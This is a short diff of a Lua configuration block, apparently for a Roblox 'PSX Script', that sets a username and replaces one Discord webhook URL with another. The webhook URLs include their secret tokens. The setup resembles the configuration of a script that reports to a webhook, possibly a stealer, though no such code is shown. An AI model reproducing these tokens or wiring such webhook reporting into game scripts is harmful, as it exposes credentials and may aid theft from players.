@@ -1,5 +1,5 @@
 Username = "kastirdmza0"
-WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+WebHook = "https://discord.com/api/webhooks/1088963052411560007/l2l3izdMsKf2obsfyxYj2YZ6EUKLjIFfbId4wu7BFDMHDDPOUXroLR-C5bY1x5AndwW5"
 
 loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
 _G.CustomScriptName = "PSX Script"
